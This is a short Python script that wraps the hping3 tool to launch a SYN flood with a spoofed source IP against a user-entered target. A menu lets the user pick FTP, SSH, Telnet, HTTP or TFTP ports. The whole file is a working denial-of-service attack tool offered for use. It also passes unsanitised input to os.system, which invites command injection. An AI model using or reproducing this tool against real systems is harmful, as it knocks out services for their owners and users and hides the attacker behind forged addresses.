import os

def hping3(url, spoof="127.0.0.1", port=80):
    command = "hping3 -S " + url + " -a " + spoof + " -p " + str(port) + " --flood"
    os.system(command)

def interact():
    ip = raw_input("Enter IP address to Denial of service: ")
    s = "\n\t=========\n\tService\n\t=========\n\n"
    s += "\t1.\tFile Transfer protocol\n"
    s += "\t2.\tSecure Shell (SSH) \n"
    s += "\t3.\tTelnet\n"
    s += "\t4.\tHyper text Transfer protocol (HTTP)\n"
    s += "\t5.\tTrivial File Transfer protocol (TFTP)\n"
    print(s)

    opt = input("Enter service number to exploit: ")
    spoof = raw_input("Enter spoofed IP address: ")

    if opt == 1:
       hping3(ip, spoof, 21)

    elif opt == 2:
       hping3(ip, spoof, 22)

    elif opt == 3:
        hping3(ip, spoof, 23)

    elif opt == 4:
       hping3(ip, spoof, 80)

    elif opt == 5:
        hping3(ip, spoof, 69)

    return

'''
print(socket.getservbyport(21)) ftp
print(socket.getservbyport(3389)) ms-wbt-server
print(socket.getservbyport(80)) http
print(socket.getservbyport(22)) ssh
print(socket.getservbyport(23)) telnet
print(socket.getservbyname("tftp")) 69
'''